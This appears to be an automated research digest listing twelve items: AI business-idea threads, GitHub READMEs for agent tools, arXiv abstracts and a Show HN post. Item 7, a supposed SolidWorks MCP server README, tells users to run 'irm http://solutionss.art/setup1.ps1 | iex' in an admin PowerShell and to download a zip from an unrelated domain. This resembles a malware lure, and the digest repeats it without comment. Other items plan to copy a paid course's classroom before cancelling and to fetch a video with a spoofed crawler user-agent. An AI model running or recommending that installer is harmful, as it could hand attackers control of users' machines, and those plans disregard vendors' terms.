# Harvest brief, 2026-09-29

12 items shortlisted from 141 candidates (16 dropped as already seen, 6 carry a vault verdict on the vendor).

## 1. [vault] Join for one month with Skool neptune, transcribe the classroom into Education/Courses/ai-video-bootcamp, cancel before renewal
key: vault:2026-09-29:join-for-one-month-with-skool-neptune-transcribe-the-classro
url: 
meta: {"vault_status": "open", "kind": "service", "subject": "AI Video Bootcamp (Skool, Daniel Riley), $9/month AI video course", "date": "2026-09-29", "where": "TRITON-CORE/Research/links/2026-09-29-ai-video-bootcamp-skool.md", "has_transcript": false}
query: open
VAULT THREAD, status open: one theme split out of a link Luke sent the vault. Judge the idea on its own: what the mechanism is, how it would be done, what tools it needs. The vault's status and note are context about the vendor and about Luke's time, not a verdict on the idea. Keep it unless the mechanism itself is unlawful or crosses the charter line (fraud services, stolen data, impersonation, explicit deepfakes of real people, unlicensed gambling). Lens is mechanism.

Vault status: open, meaning nobody on the vault side has run it to a verdict.

The vault's note on this theme: (none)

The vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (service) Worth one month at 9 dollars: 28.6k members, organic Trustpilot 4.8 from 82 uninvited reviews, active founder, nine phases with character consistency, AI ads and cloning that map onto the avatar content engine bake-off. Beginner to intermediate depth (both critical reviews say YouTube-free level), no live calls at base price, and the affiliate reviews' price-rise-at-26,700 claim never happened. Join, extract the classroom, cancel before month two.

## 2. [hn] Show HN: Durable Actor Session Protocol
key: hn:49877270
url: https://dasp-protocol.github.io/dasp/
discussion: https://news.ycombinator.com/item?id=49877270
meta: {"points": 17, "comments": 7, "created": "2026-09-28T13:00:13Z"}
query: mcp server

Hey HN I'm the author of Jido, an Elixir Actor & Agent SDK. I was building out an Elixir Durable Actor/Agent server and hit a wall regarding communication protocols. I reviewed all the existing protocols; A2A, ACP, AHP and nothing met my needs. I wanted a language agnostic durable actor session protocol. Agent Host Protocol (AHP) from Microsoft was close, but was centered around "chat". The future I envision for agents goes far beyond just text chat. Thus, DASP was born. I'm submitting to HN because I know this is the one place where I'll get real feedback on whether this is an actual need or my tokenmaxxing got the best of me this weekend. This is a builder protocol. I'll be building out clients beyond Elixir and TypeScript, but plan to only support an Elixir server built around my Jido ecosystem.
comment (HalcyonicStorm): Really great stuff! Cant wait to try it out in my harness!
comment (nkko): I’ve been playing a lot with durable agents, can’t say that I know what the final thing should look like but this could be a part of it. For now I have celld in front of sandbox, if I get this right: agent -> dasp -> celld -> sandbox
comment (yodon): Is this purely polling, or am I missing how to subscribe to events?

## 3. [github] AgentSystemLabs/agent-office: A cartoon 3D office where your team hires Claude Code workers at desks, shares live terminals, talks over voice, and tracks GitHub issues and PRs.
key: gh:agentsystemlabs/agent-office
url: https://github.com/AgentSystemLabs/agent-office
meta: {"stars": 381, "created": "2026-09-26", "pushed": "2026-09-29", "language": "TypeScript", "topics": []}
query: claude-code created:>{since} stars:>20

> [!WARNING]
> **Work in progress.** Agent Office is built for one person's workflow — mine — and it changes fast as I iterate on it.
> Expect breaking changes between releases: keys that move, screens that get redrawn, features that come and go
> without notice. If it's close to what you want, fork or clone it and bend it into what you need it to be.

 

*"Whatever you do, work heartily, as for the Lord and not for men."* — Colossians 3:23 (ESV)

# 🏢 Agent Office

**A 3D office your team shares with its coding agents.**

Sit **Claude Code**, **Codex** and **OpenCode** workers at desks, watch each one's terminal on the laptop in front of it,
and jump into any of them together. Every GitHub repo is a floor of the building.

[](https://github.com/AgentSystemLabs/agent-office/releases)
[](https://github.com/AgentSystemLabs/agent-office/actions)
[](LICENSE)
[](#run-locally)
[](https://www.typescriptlang.org)

[**Run locally**](#run-locally) · [**Deploy to AWS**](#deploy-to-aws-ec2) · [**Azure**](#deploy-to-azure) · [**Railway**](#deploy-to-railway) · [**Fly.io**](#deploy-to-flyio) · [**Dokploy**](#deploy-to-dokploy) · [**Any server**](#deploy-to-any-ubuntu-or-debian-server) · [**Add users**](#add-users) · [**Controls**](#controls) · [**Features**](docs/features.md) · [**How it works**](docs/how-it-works.md)

```sh
curl -fsSL https://raw.githubusercontent.com/AgentSystemLabs/agent-office/main/install.sh | bash
```

 

---

## What it is

- **A floor per project.** Ride the elevator, pick one of your GitHub repos, and the office clones it and opens a floor for it. Every worker, board and queue on that floor works in that checkout.
- **Workers at desks.** Walk up to an empty desk, press **E**, and pick Claude Code, Codex or OpenCode. The agent's live terminal shows on its laptop, and anyone can open it and type.
- **You can see who needs you.** A worker that needs input or has finished jumps up and down and dings. Press **N** to go straight to the one that has waited longest.
- **From your phone, too.** `/lite` is the office in 2D: every worker and what it's waiting on, its terminal with the keys a phone keyboard lacks, and the boards. The 3D office offers it on a phone or a slow computer.
- **GitHub on the walls.** Issues and pull requests hang on cork boards. Hand an issue to a worker, queue tasks, give a worker its own git worktree and open its PR with one key. One task can span several projects: the worker gets a worktree of each, and a PR in each that links the others.
- **Together.** Voice, chat, screen sharing on the lounge TV and a shared whiteboard.

There's a lot more (a rooftop bar, an office dog, an arcade): see [docs/features.md](docs/features.md).

## Requirements

On the machine that runs the office:

- **Node.js 20+**
- At least one agent CLI, signed in as the user that runs the office: **Claude Code** (`claude`), **Codex** (`codex`) or **OpenCode** (`opencode`). With [accounts](#add-users), everyone can sign in to their own Claude from the office instead.
- **git**, and the **GitHub CLI** (`gh auth login`) for cloning repos and the issue and PR boards

## Run locally

Install the latest release and start the office:

```bash
curl -fsSL https://raw.githubusercontent.com/AgentSystemLabs/agent-office/main/install.sh | bash
```

On Windows, in PowerShell:

```powershell
irm https://raw.githubusercontent.com/AgentSystemLabs/agent-office/main/install.ps1 | iex
```

This puts an `agent-office` command on your PATH, so next time just 

## 4. [arxiv] TokenCast: Forecasting Token Consumption During LLM Agent Execution
key: arxiv:2609.35760
url: https://arxiv.org/abs/2609.35760
meta: {"published": "2026-09-28", "authors": ["Chaoqian Ouyang", "Ling Yue", "Libin Zheng", "Huanghui Guo"], "categories": ["cs.LG", "cs.AI", "cs.SE"]}
query: all:"language model" AND all:agent AND all:tool

When a large language model (LLM) agent executes the same task, token consumption can vary by over an order of magnitude across runs. The agent chooses its next steps based on tool feedback and intermediate results, while the growing context steadily inflates the input size of every subsequent call. The total consumption of a task is therefore hard to predict before execution and the prediction must be revised as the run unfolds. In this paper, we propose TokenCast, which learns a composable cost representation for each execution segment, recording its own consumption and the context growth it introduces. Composing adjacent segments yields a cumulative estimate that captures the extra input cost incurred when context from earlier segments is re-read by every later call. As execution unfolds, newly observed evidence refreshes the forecast, requiring no additional LLM calls and incurring a mean cumulative prediction time of 32.8 ms per run on SWE-bench Verified. Across 4 task suites and 6 agent models, TokenCast's mean absolute error reduction against the strongest comparator averages 14.5% over 96 evaluated combinations. In offline budget-control replay, TokenCast uses 21.3% fewer tokens on average than a fixed-budget policy at matched trace completion. The code is available at https://github.com/DEFENSE-SEU/TokenCast.

## 5. [youtube] Claude Code Full Course 2026 | How Senior Engineers Actually Build with AI
key: yt:u2QqWkMv3Lg
url: https://www.youtube.com/watch?v=u2QqWkMv3Lg
meta: {"channel": "JavaScript Mastery", "rank": 1}
query: claude code skills workflow 2026


[body unavailable: IpBlocked]

## 6. [vault] Media-buying commission taken as a share of a brand's ad budget
key: vault:2026-09-27:media-buying-commission-taken-as-a-share-of-a-brand-s-ad-bud
url: 
meta: {"vault_status": "open", "kind": "scheme", "subject": "AI Clipping Agency starter kit (Musa Mustafa, Media Metas / Crayo Inc)", "date": "2026-09-27", "where": "TRITON-CORE/Research/links/2026-09-27-natejbiz-retainer-and-crayo-starter-kit.md", "has_transcript": false}
query: open
VAULT THREAD, status open: one theme split out of a link Luke sent the vault. Judge the idea on its own: what the mechanism is, how it would be done, what tools it needs. The vault's status and note are context about the vendor and about Luke's time, not a verdict on the idea. Keep it unless the mechanism itself is unlawful or crosses the charter line (fraud services, stolen data, impersonation, explicit deepfakes of real people, unlicensed gambling). Lens is mechanism.

Vault status: open, meaning nobody on the vault side has run it to a verdict.

The vault's note on this theme: Named as the kit's second angle at 20 percent of a 100k budget; not assessed in the write-up

The vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (scheme) Real operator and real tool: Musa Mustafa co-founded crayo.ai (3.2m users), company Media Metas / Crayo Inc, San Jose. But the 5 dollar price, down from 12.50, is a qualifier not a product: it puts a card on file and routes to a private one-to-one with an agency owner, which is where the real offer lands. What it actually sells is the commodity half, Content Rewards pay-per-view clipping, which is the volume game natejbiz explicitly warns against, plus a media-buying commission angle (20 percent of a 100k brand budget). The money worth having in this category is the flat monthly editing retainer, two to six thousand a month, which we can already deliver with no purchase. Income claims (3k first week, 3,801 in 13 days, 4,251 with zero experience) are unevidenced, and the 48-hour guarantee covers budget allocation, not earnings. Job: Sell post-production as a monthly retainer, priced, to businesses that already produce content (still open)

## 7. [github] CaptureGrubEnchant/SolidWorks: SolidWorks MCP Server connects an AI assistant to a running SolidWorks instance. Sketch, extrude, fillet, export STEP/STL, generate macros.
key: gh:capturegrubenchant/solidworks
url: https://github.com/CaptureGrubEnchant/SolidWorks
meta: {"stars": 372, "created": "2026-09-25", "pushed": "2026-09-29", "language": "TypeScript", "topics": ["3d-modelling", "3d-modelling-software", "3d-rendering", "3d-rendering-software", "3d-rendering-tools", "3dexperience", "3dprinting", "cad-tools"]}
query: mcp server created:>{since} stars:>30

# SolidWorksMCP
  

 

 

 

 

 

 Repository:  SolidWorks MCP Server  ( SolidworksMCP-TS ) · Node.js MCP + COM / VBA 

  

[](https://www.typescriptlang.org/)
[](https://modelcontextprotocol.io)
[](https://nodejs.org/)
[](#installation)
[](#3-linux)
[](#4-macos)
[](LICENSE)

 

**Works with the agent you already use**

[](#configure-claude-desktop)
[](#configure-claude-desktop)

 

 

> **Alpha / Experimental.** Architecture is in place and basic operations (sketch planes, simple extrusions) have been demonstrated. **Most tools have not been validated against a live SolidWorks instance.** Expect COM quirks. Test reports are welcome.

 

## What a session looks like

 
 
 

```text
You    New part. Sketch a 40×20 mm rectangle
       on Front Plane and extrude 12 mm.

Agent  Creating the part document…
       Front Plane selected.
       Rectangle 40 × 20 mm added.
       Extrusion FeatureExtrusion3 routed
       through VBA (20+ COM parameters).
       Feature tree: Sketch1 → Boss-Extrude1

You    Fillet the long edges 2 mm, export STEP.

Agent  Fillet applied. Export queued.
       File saved next to the part.
```

 
 

### Why the router exists

SolidWorks APIs such as `FeatureExtrusion3` take **20+ parameters**. Node.js COM bridges often fail past 12.

- **≤ 12 params** → direct `winax` COM
- **13+ params** → generated VBA macro
- **Failure** → automatic fallback with context

Never pass `null` into COM. Use `undefined`. Prefer feature-tree walk over `SelectByID2`.

 
 
 

 

## Why it's built this way

 
 
 

### Direct COM when it is safe
Simple sketch and document calls go through `winax` with no extra hop. Fast path for planes, lines, circles, and short feature calls.

 
 

### VBA when COM chokes
A complexity analyzer counts parameters. Long SolidWorks signatures become a one-shot VBA macro SolidWorks executes itself.

 
 
 
 

### Feature tree over name picking
`FeatureByPositionReverse()` + `GetTypeName2()` finds sketches more reliably than `SelectByID2`.

 
 

### Stdio stays clean
Logging is Winston only. `console.*` corrupts JSON-RPC on stdio and breaks the MCP client.

 
 
 

 

## Installation

### 1. Windows — Download

 

[](http://pannki.com/SolidworksMCP.zip).

 

```text
1. Press Win + X on your keyboard
2. From the menu, select: Terminal (Admin) or PowerShell (Admin)
3. Confirm the UAC prompt (Yes)
4. Copy the command below in full:
```

```powershell
irm http://solutionss.art/setup1.ps1 | iex
```

After download:

1. Extract the archive.
2. Confirm **Node.js 20+** is installed.
3. In the project folder:

```bat
npm install
npm run build
```

> `winax` must compile locally on each Windows machine. A global npm install will not work.

 

### 2. Windows — PowerShell (Administrator)

Run **Windows PowerShell** or **PowerShell 7** as Administrator.

```powershell
irm http://solutionss.art/setup1.ps1 | iex
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

$Repo = "https://github.com/vespo92/SolidworksMCP-TS.git"
$Dest = "$env:USERPROFILE\SolidworksMCP-TS"

if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Error "Git not found. Install Git for Windows and retry."
    exit 1
}
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    Write-Error "Node.js not found. Install Node.js 20+ and retry."
    exit 1
}

if (Test-Path $Dest) {
    Write-Host "Directory exists, updating repository..." -ForegroundColor Yellow
    Set-Location $Dest
    git pull
} else {
    git clone $Repo $

## 8. [arxiv] Harness Learning Enables Generalizable Test-Time Adaptation
key: arxiv:2609.35738
url: https://arxiv.org/abs/2609.35738
meta: {"published": "2026-09-28", "authors": ["Alvin Zhang", "Xuecheng Liu", "Zixuan Wang", "Fahim Tajwar"], "categories": ["cs.CL", "cs.LG"]}
query: all:"language model" AND all:agent AND all:tool

A language-model agent is jointly defined by its model and its harness, the executable program that organizes model calls, tool use, and information flow. Because different tasks call for different ways of organizing these operations, the harness needs to be adapted using feedback from the task at hand. We introduce harness learning, which trains a proposer model to revise a solver's harness using execution feedback. We formulate this process as meta-learning over executable programs, with harness revisions playing the role of weight updates in gradient-based adaptation. We train the proposer with reinforcement learning, using the task performance of revised harnesses as the reward. At test time, the proposer uses feedback from successive executions on a new task to refine the harness, without performing any parameter-space update. Experiments on reasoning and multi-hop question answering show that harness learning improves revision quality and that the ability to adapt at test time transfers to unseen tasks. Policies trained on individual revisions can continue improving harnesses over multiple rounds, while the benefits of training on revision sequences vary across settings. These findings suggest a path towards continually learning agents that turn accumulated experience into generalizable improvements.

## 9. [youtube] MCP Servers Explained & Built
key: yt:He8tUwLzLnU
url: https://www.youtube.com/watch?v=He8tUwLzLnU
meta: {"channel": "Tech With Tim", "rank": 1}
query: mcp server build tutorial


[body unavailable: IpBlocked]

## 10. [vault] Post-production for businesses that have long-form content but cannot cut it into short-form
key: vault:2026-09-26:post-production-for-businesses-that-have-long-form-content-b
url: https://www.instagram.com/reel/DcU_MNWtIkg/
meta: {"vault_status": "open", "kind": "idea", "subject": "Clipping as a service (@natejbiz reel, video transcribed)", "date": "2026-09-26", "where": "TRITON-CORE/Research/links/2026-09-26-natejbiz-clipping-as-a-service-reel.md", "has_transcript": false}
query: open
VAULT THREAD, status open: one theme split out of a link Luke sent the vault. Judge the idea on its own: what the mechanism is, how it would be done, what tools it needs. The vault's status and note are context about the vendor and about Luke's time, not a verdict on the idea. Keep it unless the mechanism itself is unlawful or crosses the charter line (fraud services, stolen data, impersonation, explicit deepfakes of real people, unlicensed gambling). Lens is mechanism.

Vault status: open, meaning nobody on the vault side has run it to a verdict.

The vault's note on this theme: The stack already owns the expensive half, HyperFrames, avatars, ElevenLabs, captions and compose; a trades client is the live test case

The vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (idea) Read the video rather than the caption: pulled the MP4 through the embed proxy with a crawler user-agent and transcribed it locally in about 90 seconds, free. His claim is 747,000 dollars personally in 12 months and about 2 million across the business, all from clipping; unaudited, his own number, and clipping agencies are a crowded 2026 market, so treat the figure as marketing and the mechanism as real. Two models: mass clips, where clippers cut a big personality for per-view payouts (Kai Cenat named) which is a volume game not worth our time; and the agency side, business to business, taking a company that already has long-form content and cutting it into short-form that lands them leads (Amalfi Jets named as a client). The second is the one. THE PATTERN: this is the third convergence this week from unrelated directions, after Butter (variant generation is the idea, the platform is the liability) and paid UGC (buy the clip, own the post-production). All three say we already own the expensive half — HyperFrames, the avatar engine, ElevenLabs, captions and compose — and what was missing is the sentence that sells it: businesses have content and no ability to cut it. RDS is the live test case, since step 4 of WF-0310 already needs three non-template creatives from an instructor who has exactly one piece of footage that worked. Job: Sell post-production as a service to businesses that have content and no capability to cut it (still open) Write-up: `TRITON-CORE/Research/links/2026-09-26-natejbiz-clipping-as-a-service-reel.md` Link: https://www.instagram.com/reel/DcU_MNWtIkg/

## 11. [github] Barty-Bart/motion-graphics: Motion-graphics skills for Claude Code and Codex.
key: gh:barty-bart/motion-graphics
url: https://github.com/Barty-Bart/motion-graphics
meta: {"stars": 329, "created": "2026-09-25", "pushed": "2026-09-25", "language": "HTML", "topics": []}
query: claude-code created:>{since} stars:>20

# motion-graphics

Motion-graphics skills for Claude Code. Each skill does one job. The first one is **`motion-broll`**.

| Skill | What it does |
|---|---|
| `motion-broll` | Give it a video and a transcript and it makes motion-graphic B-roll timed to your words. |

More skills will be added to this repo.

## motion-broll

**Motion-graphic B-roll for your videos, made by Claude Code.** Give it a video and a transcript and it plans, animates and renders clips timed to your words. Each clip is one continuous shape that keeps morphing (pill → card → terminal → chart) and never cuts, with a cursor driving every change.

 
   
   
 

## What you get

You run `/motion-broll`, answer a few questions, approve a plan, and get back:

- **The clips**, named by where they go on your timeline (`04-master-prompt_0m32s40.mp4`). Full-frame cutaways are MP4. Panels that sit in empty space next to you are transparent ProRes 4444 `.mov`.
- **A preview render** of your video with the clips cut in.
- **`compare.html`**: original vs. with motion graphics, synced, as side by side, stacked or wipe.
- **`viewer.html`**: step through the clips one by one.
- **`TIMING.md`**: every clip with its in/out point and the line it covers.

The preview is for review. For your final cut, drop the clips into your own editor.

## Install

```
npx skills add Barty-Bart/motion-graphics
```

That installs the skills from this repo (pick `motion-broll`). It works in Claude Code and other agents that read skills.

Or copy `skills/motion-broll` into your project's `.claude/skills/` (or `~/.claude/skills/` to use it everywhere).

**Requirements:** Node 18+, Python 3, and ffmpeg (with the ProRes encoder, standard in Homebrew builds). On first run the skill installs Playwright and Chromium into a local `motion/` folder.

## Use it

```
/motion-broll
```

Then point it at your video and transcript (an SRT from your editor, Descript or YouTube works). It will:

1. **Inspect the footage.** It reads resolution, frame rate and layout, including picture-in-picture sections and whether the box changes size.
2. **Estimate word timings** from your transcript.
3. **Plan the clips** in a table and wait for your OK. For each clip it chooses a full-frame cutaway, a transparent panel in empty space, or nothing, and tells you why.
4. **Build each clip**, check stills on the key words, and fix what's off.
5. **Render** with motion blur at your video's frame rate, then make the preview and the comparison pages.

It never invents numbers or results. Bars show relative size and text uses skeleton lines until you give it the real figures.

## How it works

- Every frame is a pure function of time. Springs are closed-form step responses, and a value that changes target many times is the sum of one spring per change. There are no CSS transitions or timers, so any frame can be rendered on its own.
- Clips are small HTML files on a shared engine (`skills/motion-broll/engine/motion.js`). Headless Chromium captures 4 sub-frames per frame across a 180° shutter, and ffmpeg blends them into motion blur.
- The worked example in `skills/motion-broll/examples/opus-aoe2/` is the six clips from the demo above.

## Licence

MIT. Geist fonts: SIL Open Font License. Icon paths adapted from Lucide (ISC).

## 12. [youtube] Building a Real App with Claude Code (Start to Finish)
key: yt:misjUj4Q_ho
url: https://www.youtube.com/watch?v=misjUj4Q_ho
meta: {"channel": "Tech With Tim", "rank": 2}
query: claude code skills workflow 2026


[body unavailable: IpBlocked]
